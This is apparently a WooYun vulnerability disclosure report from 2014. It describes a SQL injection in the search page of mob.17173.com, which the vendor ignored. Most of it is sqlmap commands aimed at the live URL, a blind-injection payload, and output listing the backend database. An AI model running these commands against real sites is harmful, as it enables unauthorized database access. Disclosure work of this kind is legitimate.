wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-12-07：	细节已通知厂商并且等待厂商处理中									2014-12-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  http://mob.17173.com/search.php 存在搜索注入post:keys=1&Tclass=1&searchclass=News_title&Submit=%CB%D1+%CB%F7&page=(searchclass参数存在注入)sqlmap -u "http://mob.17173.com/search.php" --data "keys=1&Tclass=1&searchclass=News_title&Submit=%CB%D1+%CB%F7&page="
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: searchclass    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keys=1&Tclass=1&searchclass=News_title AND 9512=9512&Submit=%CB%D1 %CB%F7&page=---[19:37:19] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 4[19:37:19] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/mob.17173.com'
sqlmap -u "http://mob.17173.com/search.php" --data "keys=1&Tclass=1&searchclass=News_title&Submit=%CB%D1+%CB%F7&page=" --dbs
[19:38:14] [INFO] falling back to current database[19:38:14] [INFO] fetching current database[19:38:14] [INFO] resumed: gamesavailable databases [1]:[*] games[19:38:14] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/mob.17173.com'
   漏洞证明：  http://mob.17173.com/search.php 存在搜索注入post:keys=1&Tclass=1&searchclass=News_title&Submit=%CB%D1+%CB%F7&page=(searchclass参数存在注入)sqlmap -u "http://mob.17173.com/search.php" --data "keys=1&Tclass=1&searchclass=News_title&Submit=%CB%D1+%CB%F7&page="
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: searchclass    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keys=1&Tclass=1&searchclass=News_title AND 9512=9512&Submit=%CB%D1 %CB%F7&page=---[19:37:19] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 4[19:37:19] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/mob.17173.com'
